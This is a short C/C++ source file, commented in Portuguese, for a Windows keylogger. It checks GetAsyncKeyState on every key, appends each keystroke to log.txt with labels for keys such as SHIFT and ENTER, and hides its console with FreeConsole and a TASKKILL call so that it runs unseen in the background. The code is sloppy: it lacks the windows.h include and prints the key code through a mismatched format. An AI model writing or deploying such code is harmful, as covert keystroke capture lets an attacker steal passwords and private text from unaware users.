#include <stdio.h>
#include <stdlib.h>
#include <iostream>

using namespace std;

/***********************************************************************************************************************/

int VK[] = {16, 8, 1, 13, 27, 17, 9};
char Keys[7][13] = {" [SHIFT] ", " [BACK] ", " [LBUTTON] ", " [ENTER] ", " [ESC] ", " [CTRL] ", " [TAB] "};

/***********************************************************************************************************************/

/**
  * Método de registrar tecla pressionada no arquivo de saída
  *
  * @param _key recebe a tecla que foi ativada (a que será registrada)
  * @param file recebe o rquivo de saída que será gravada a tecla

  * @authr mazurco066
  */
void log(int _key, char *file){

    Sleep(10);

    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file , "at");

    int i;
    for (i = 0; i <= 7; i++){

        if (i < 7){

            if (_key == VK[i]){

                fprintf(OUTPUT_FILE, "%s", Keys[i]);
                if (_key == VK[3]) fprintf(OUTPUT_FILE, "\n");
                break;
            }

        }

        if(i == 7) fprintf(OUTPUT_FILE, "%s", &_key);

    }

    fclose(OUTPUT_FILE);
}

/***********************************************************************************************************************/

/**
  * Método para separar processo do console para rodar em background
  *
  * @authr mazurco066
  */
void hide(){

    FreeConsole();
    system("TASKKILL /f /im cb_console_runner.exe");
}

/***********************************************************************************************************************/

int main(){

    //Counter
    int i;

    //Init
    hide();

    //Loop
    while (true){

            Sleep(10);

            for (i = 8; i < 255; i++){

                    if (GetAsyncKeyState(i) == -32767){
                        printf("%d", i);
                        log(i, "log.txt");
                    }
            }
    }

    return 0;
}

/***********************************************************************************************************************/
